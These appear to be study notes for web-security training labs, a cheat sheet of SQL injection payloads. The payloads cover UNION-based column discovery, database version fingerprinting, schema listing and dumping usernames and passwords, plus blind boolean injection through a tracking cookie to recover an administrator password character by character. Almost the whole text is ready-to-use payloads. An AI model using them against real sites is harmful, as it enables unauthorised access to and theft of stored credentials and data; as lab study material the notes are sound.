# SQL Injection 

[SQL cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)

## UNION attack
### 1) Determining the number of columns returned by the query

> **'+UNION+SELECT+NULL,NULL--** 
>
Using the above command continue adding null values until the error disappears and the response includes additional content containing the null values.

### 2) Finding a column containing text
Try replacing each null with the random value provided by the lab, for example:
> **'+UNION+SELECT+'abcdef',NULL,NULL--**
>
If an error occurs, move on to the next null and try that instead.

### 3) Retrieving data from other tables
Use the following payload to retrieve the contents of the users table: 
> **'+UNION+SELECT+username_column,+password_column+FROM+table_name--**
>

### 4) Retrieving multiple values in a single column

Use the following payload to retrieve the contents of the users table: 
> **'+UNION+SELECT+NULL,username||'~'||password+FROM+users--**
>
the '~' is used to add values to the single column 

## Finding versions
### 5) querying the database type and version on Oracle
There is a built-in table on Oracle called DUAL which you can use for this purpose. For example: 
> **UNION+SELECT+'abc'+FROM+DUAL**
>
Use the following payload to display the database version of *ORACLE*: 
>**'+UNION+SELECT+BANNER,+NULL+FROM+v$version--**
>
Use the following payload to display the database version of *MYSQL and MICROSOFT*: 
>**'+UNION+SELECT+@@version,+NULL#**
>
listing the database contents on *non-Oracle databases*
>**'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--**
>**'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='USERS_ABCDEF'--**
>

## Blind injection
### 6) Blind SQL injection with conditional responses
Boolean injection to find password of admin, below is a boolean injection
>** TrackingId=x'+OR+1=1--**
>
below is used to find the length of password using *length()* function
>**TrackingId=x'+UNION+SELECT+'a'+FROM+users+WHERE+username='administrator'+AND+length(password)>1--**
>
To find characters of the password  using *substring()* function by changing index numbers after column name (here password)
>**TrackingId=x'+UNION+SELECT+'a'+FROM+users+WHERE+username='administrator'+AND+substring(password,1,1)='a'--**


